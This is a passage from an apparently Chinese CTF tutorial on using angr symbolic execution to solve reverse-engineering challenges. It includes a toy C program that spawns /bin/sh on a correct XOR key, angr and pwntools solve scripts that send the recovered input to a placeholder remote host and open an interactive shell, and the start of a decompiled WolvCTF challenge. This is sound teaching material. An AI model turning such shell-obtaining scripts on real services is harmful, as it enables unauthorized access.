style="--0:#E1E4E8;--1:#24292E">] </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#9ECBFF;--1:#032F62">"_________________&#x3C;Text_1>______________</span><span style="--0:#79B8FF;--1:#005CC5">\xC0\xDE</span><span style="--0:#9ECBFF;--1:#032F62">"</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">void</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#B392F0;--1:#6F42C1">win</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#F97583;--1:#BF3441">void</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">{</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent">    </span><span style="--0:#B392F0;--1:#6F42C1">system</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#9ECBFF;--1:#032F62">"/bin/sh"</span><span style="--0:#E1E4E8;--1:#24292E">);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">void</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#B392F0;--1:#6F42C1">main</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#F97583;--1:#BF3441">void</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">{</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent">    </span><span style="--0:#F97583;--1:#BF3441">char</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#FFAB70;--1:#AE4B07">input</span><span style="--0:#E1E4E8;--1:#24292E">[</span><span style="--0:#79B8FF;--1:#005CC5">50</span><span style="--0:#E1E4E8;--1:#24292E">];</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent">    </span><span style="--0:#B392F0;--1:#6F42C1">fgets</span><span style="--0:#E1E4E8;--1:#24292E">(input, </span><span style="--0:#F97583;--1:#BF3441">sizeof</span><span style="--0:#E1E4E8;--1:#24292E">(input) </span><span style="--0:#F97583;--1:#BF3441">-</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">1</span><span style="--0:#E1E4E8;--1:#24292E">, stdin);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent">    </span><span style="--0:#F97583;--1:#BF3441">if</span><span style="--0:#E1E4E8;--1:#24292E"> (</span><span style="--0:#B392F0;--1:#6F42C1">strlen</span><span style="--0:#E1E4E8;--1:#24292E">(input) </span><span style="--0:#F97583;--1:#BF3441">==</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#B392F0;--1:#6F42C1">strlen</span><span style="--0:#E1E4E8;--1:#24292E">(key)) {</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent">        </span><span style="--0:#F97583;--1:#BF3441">for</span><span style="--0:#E1E4E8;--1:#24292E"> (</span><span style="--0:#F97583;--1:#BF3441">int</span><span style="--0:#E1E4E8;--1:#24292E"> i </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">0</span><span style="--0:#E1E4E8;--1:#24292E">; i </span><span style="--0:#F97583;--1:#BF3441">&#x3C;</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#B392F0;--1:#6F42C1">strlen</span><span style="--0:#E1E4E8;--1:#24292E">(key); i</span><span style="--0:#F97583;--1:#BF3441">++</span><span style="--0:#E1E4E8;--1:#24292E">) {</span></div></div><div class="ec-line" style="--ecIndent:12ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent">            </span><span style="--0:#F97583;--1:#BF3441">if</span><span style="--0:#E1E4E8;--1:#24292E"> ((</span><span style="--0:#FFAB70;--1:#AE4B07">input</span><span style="--0:#E1E4E8;--1:#24292E">[i] </span><span style="--0:#F97583;--1:#BF3441">^</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">27</span><span style="--0:#E1E4E8;--1:#24292E">) </span><span style="--0:#F97583;--1:#BF3441">!=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#FFAB70;--1:#AE4B07">key</span><span style="--0:#E1E4E8;--1:#24292E">[i]) {</span></div></div><div class="ec-line" style="--ecIndent:16ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent">                </span><span style="--0:#B392F0;--1:#6F42C1">exit</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#79B8FF;--1:#005CC5">0</span><span style="--0:#E1E4E8;--1:#24292E">);</span></div></div><div class="ec-line" style="--ecIndent:12ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">            </span></span><span style="--0:#E1E4E8;--1:#24292E">}</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">        </span></span><span style="--0:#E1E4E8;--1:#24292E">}</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span class="indent">        </span><span style="--0:#B392F0;--1:#6F42C1">system</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#9ECBFF;--1:#032F62">"/bin/sh"</span><span style="--0:#E1E4E8;--1:#24292E">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">    </span></span><span style="--0:#E1E4E8;--1:#24292E">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="#include <stdio.h>#include <stdlib.h>#include <string.h>char key[50] = &#x22;_________________<Text_1>______________\xC0\xDE&#x22;;void win(void){    system(&#x22;/bin/sh&#x22;);}void main(void){    char input[50];    fgets(input, sizeof(input) - 1, stdin);    if (strlen(input) == strlen(key)) {        for (int i = 0; i < strlen(key); i++) {            if ((input[i] ^ 0x27) != key[i]) {                exit(0);            }        }        system(&#x22;/bin/sh&#x22;);    }}"><div></div></button></div></figure></div>
<p>这里是要输入一个合适的字符串, 使程序走到 system 这一行
然后我就想到了可以用 Angr 来爆破输入的字符串
编译命令</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:20ch"><code><div class="ec-line"><div class="code"><span style="--0:#B392F0;--1:#6F42C1">gcc</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#9ECBFF;--1:#032F62">chall.c</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">-o</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#9ECBFF;--1:#032F62">chall</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="gcc chall.c -o chall"><div></div></button></div></figure></div>
<p>解决脚本:</p>
<div class="expressive-code"><figure class="frame has-title"><figcaption class="header"><span class="title">solve.py</span></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:61ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">import</span><span style="--0:#E1E4E8;--1:#24292E"> angr</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">import</span><span style="--0:#E1E4E8;--1:#24292E"> sys</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 程序地址</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">path_to_binary </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#9ECBFF;--1:#032F62">"./chall"</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 载入程序</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">project </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> angr.Project(path_to_binary)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 入口点为默认程序入口点</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">initial_state </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> project.factory.entry_state()</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 初始化模拟器</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">simulation </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> project.factory.simgr(initial_state)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># system 那一行的地址 (0x400000 开头是因为 Angr 的 pie 地址默认是 0x400000)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">print_good_address </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">400924</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 寻找解决方案</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">simulation.explore(</span><span style="--0:#FFAB70;--1:#AE4B07">find</span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E">print_good_address)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">if</span><span style="--0:#E1E4E8;--1:#24292E"> simulation.found:</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">    </span></span><span style="--0:#E1E4E8;--1:#24292E">solution_state </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> simulation.found[</span><span style="--0:#79B8FF;--1:#005CC5">0</span><span style="--0:#E1E4E8;--1:#24292E">]</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent">    </span><span style="--0:#99A0A6;--1:#616972"># 输出输入值</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">    </span></span><span style="--0:#E1E4E8;--1:#24292E">solution </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> solution_state.posix.dumps(sys.stdin.fileno())</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span class="indent">    </span><span style="--0:#79B8FF;--1:#005CC5">print</span><span style="--0:#E1E4E8;--1:#24292E">(solution)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">else</span><span style="--0:#E1E4E8;--1:#24292E">:</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span class="indent">    </span><span style="--0:#F97583;--1:#BF3441">raise</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">Exception</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#9ECBFF;--1:#032F62">'Could not find the solution'</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="import angrimport sys# 程序地址path_to_binary = &#x22;./chall&#x22;# 载入程序project = angr.Project(path_to_binary)# 入口点为默认程序入口点initial_state = project.factory.entry_state()# 初始化模拟器simulation = project.factory.simgr(initial_state)# system 那一行的地址 (0x400000 开头是因为 Angr 的 pie 地址默认是 0x400000)print_good_address = 0x400924# 寻找解决方案simulation.explore(find=print_good_address)if simulation.found:    solution_state = simulation.found[0]    # 输出输入值    solution = solution_state.posix.dumps(sys.stdin.fileno())    print(solution)else:    raise Exception(&#x27;Could not find the solution&#x27;)"><div></div></button></div></figure></div>
<p>然后</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:111ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">from</span><span style="--0:#E1E4E8;--1:#24292E"> pwn </span><span style="--0:#F97583;--1:#BF3441">import</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">*</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 提交解决方案地址</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">lib </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> remote(</span><span style="--0:#9ECBFF;--1:#032F62">"&#x3C;remote addr>"</span><span style="--0:#E1E4E8;--1:#24292E">, </span><span style="--0:#79B8FF;--1:#005CC5">1111</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 上一步获得的值</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">lib.sendline(</span><span style="--0:#F97583;--1:#BF3441">b</span><span style="--0:#9ECBFF;--1:#032F62">'cNB@H</span><span style="--0:#79B8FF;--1:#005CC5">\x07</span><span style="--0:#9ECBFF;--1:#032F62">}FDDFN</span><span style="--0:#79B8FF;--1:#005CC5">\x07</span><span style="--0:#9ECBFF;--1:#032F62">NT</span><span style="--0:#79B8FF;--1:#005CC5">\x07</span><span style="--0:#9ECBFF;--1:#032F62">SOB</span><span style="--0:#79B8FF;--1:#005CC5">\x07</span><span style="--0:#9ECBFF;--1:#032F62">EBTS</span><span style="--0:#79B8FF;--1:#005CC5">\x07</span><span style="--0:#9ECBFF;--1:#032F62">dtb</span><span style="--0:#79B8FF;--1:#005CC5">\x07</span><span style="--0:#9ECBFF;--1:#032F62">WUHABTTHU</span><span style="--0:#79B8FF;--1:#005CC5">\t\xe7\xf9\x00\x00\x00\x00\x00\x00\x00</span><span style="--0:#9ECBFF;--1:#032F62">'</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">lib.interactive()</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="from pwn import *# 提交解决方案地址lib = remote(&#x22;<remote addr>&#x22;, 1111)# 上一步获得的值lib.sendline(b&#x27;cNB@H\x07}FDDFN\x07NT\x07SOB\x07EBTS\x07dtb\x07WUHABTTHU\t\xe7\xf9\x00\x00\x00\x00\x00\x00\x00&#x27;)lib.interactive()"><div></div></button></div></figure></div>
<h2 id="angr---2"><a class="not-prose" href="#angr---2">angr - 2</a></h2>
<p>当我们遇到像下面这种一长串来验证一个<code>FLAG</code>全局变量的时候(<a href="https://github.com/Nambers/ctf-writeups/blob/main/WolvCTF-2023/Reverse-Homework_Help-Easy-Medium/solve.md" rel="noreferrer noopener" target="_blank">WolvCTF23-Rev-Homework_help</a>):</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:61ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">void</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#B392F0;--1:#6F42C1">__stack_chk_fail</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#F97583;--1:#BF3441">void</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">{</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent">  </span><span style="--0:#F97583;--1:#BF3441">int</span><span style="--0:#E1E4E8;--1:#24292E"> iVar1;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">  </span><span style="--0:#F97583;--1:#BF3441">long</span><span style="--0:#E1E4E8;--1:#24292E"> lVar2;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent">  </span><span style="--0:#F97583;--1:#BF3441">uint</span><span style="--0:#E1E4E8;--1:#24292E"> uVar3;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent">  </span><span style="--0:#F97583;--1:#BF3441">long</span><span style="--0:#E1E4E8;--1:#24292E"> in_FS_OFFSET;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent">  </span><span style="--0:#F97583;--1:#BF3441">uint</span><span style="--0:#E1E4E8;--1:#24292E"> local_15c;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent">  </span><span style="--0:#F97583;--1:#BF3441">uint</span><span style="--0:#E1E4E8;--1:#24292E"> auStack344 [</span><span style="--0:#79B8FF;--1:#005CC5">2</span><span style="--0:#E1E4E8;--1:#24292E">];</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">undefined8 local_150;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">undefined8 local_148;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">undefined8 local_140;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">undefined8 local_138;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">undefined8 local_130;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">undefined8 local_128;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">undefined8 local_120;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">undefined8 local_118;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">undefined8 local_110;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">undefined8 local_108;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">undefined8 local_100;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">undefined8 local_f8;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">undefined8 local_f0;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">undefined8 local_e8;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">undefined8 local_e0;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">__jmp_buf_tag local_d8;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code"><span class="indent">  </span><span style="--0:#F97583;--1:#BF3441">long</span><span style="--0:#E1E4E8;--1:#24292E"> local_10;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">26</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">27</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">local_10 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">*</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#F97583;--1:#BF3441">long</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">*</span><span style="--0:#E1E4E8;--1:#24292E">)(in_FS_OFFSET </span><span style="--0:#F97583;--1:#BF3441">+</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">28</span><span style="--0:#E1E4E8;--1:#24292E">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">28</div></div><div class="code"><span class="indent">  </span><span style="--0:#FFAB70;--1:#AE4B07">auStack344</span><span style="--0:#E1E4E8;--1:#24292E">[</span><span style="--0:#79B8FF;--1:#005CC5">1</span><span style="--0:#E1E4E8;--1:#24292E">] </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">14</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">29</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">local_150 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">1200000017</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">30</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">local_148 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">500000001d</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">31</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">local_140 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">5d00000046</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">32</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">local_138 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">4100000042</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">33</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">local_130 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">330000006c</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">34</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">local_128 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">5a0000005d</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">35</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span 